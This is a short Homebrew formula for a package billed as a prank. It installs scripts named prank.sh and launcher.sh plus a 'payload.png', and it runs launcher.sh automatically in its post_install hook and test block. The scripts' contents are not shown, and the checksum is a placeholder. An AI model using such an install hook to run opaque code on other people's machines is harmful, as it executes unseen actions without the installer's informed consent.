class Dingdong < Formula
  desc "🎭 Karan's Ultimate Prank - Launcher Auto-Execution"
  homepage "https://github.com/punkkkkkkk/dingdong"
  url "https://github.com/punkkkkkkk/dingdong/archive/refs/heads/main.zip"
  version "3.7.0"
  sha256 "CALCULATE_NEW_HASH_AFTER_UPDATING"

  def install
    bin.install "prank.sh"
    bin.install "launcher.sh"
    pkgshare.install "payload.png"
  end

  def post_install
    ohai "🎭 Karan's Ultimate Prank v3.7"
    ohai "🚀 Using launcher script for guaranteed execution"
    
    # Execute the simple launcher script instead
    system "#{bin}/launcher.sh"
    
    ohai "✅ launched via launcher script!"
  end

  test do
    system "#{bin}/launcher.sh"
  end
end
